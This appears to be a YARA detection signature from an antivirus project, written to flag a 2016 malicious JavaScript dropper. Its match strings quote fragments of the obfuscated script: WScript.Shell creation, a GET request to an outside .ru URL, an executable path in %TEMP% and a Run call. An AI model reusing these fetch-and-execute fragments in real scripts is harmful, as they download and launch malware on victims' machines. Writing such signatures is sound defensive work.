rule sig_20160330_6366ca3b99da0e71345046067a1b3946 {
  meta:
    description = "datamaliciousorder - file 20160330_6366ca3b99da0e71345046067a1b3946.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e8327b28f8b79f6b2e0e8a7810c8ea9608d17b2291fd80e3a990f308019b4c02"

  strings:
    $s1  = "var QU = function J() {return WScript[RK](\"WScript\"+\".Shell\");}(), TI = 11;" fullword ascii
    $s2  = "T[F](\"GET\", \"http://jafes.ru/b0ros\", false);" fullword ascii
    $s3  = "function A(BL, U){Y = Y * 1; return BL - U;};" fullword ascii
    $s4  = "if (T[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function CX(){return F0 + \"\";};" fullword ascii
    $s6  = "function BE(O1){QU[\"Run\"](O1, Y, Y);};" fullword ascii
    $s7  = "function Q() {return ((MS == true) && (MS == LT)) ? 1 : Y;};" fullword ascii
    $s8  = "function G()" fullword ascii
    $s9  = "var AT = new this[\"Date\"]();" fullword ascii
    $s10 = "function UR(){return 22;};" fullword ascii
    $s11 = "}while (M);" fullword ascii
    $s12 = "return A(QY, L);" fullword ascii
    $s13 = "function O0(X) {var WA = (1, 2, 3, 4, 5, X); return WA;};" fullword ascii
    $s14 = "function O() {return QU[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"gjuDirSSX6CAyb.ex\" + \"e\";};" fullword ascii
    $s15 = "function IQ(){return RK;};" fullword ascii
    $s16 = "var QE = false;" fullword ascii
    $s17 = "var LT = false;" fullword ascii
    $s18 = "MS = true; " fullword ascii
    $s19 = "var MS = false;" fullword ascii
    $s20 = "LT = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}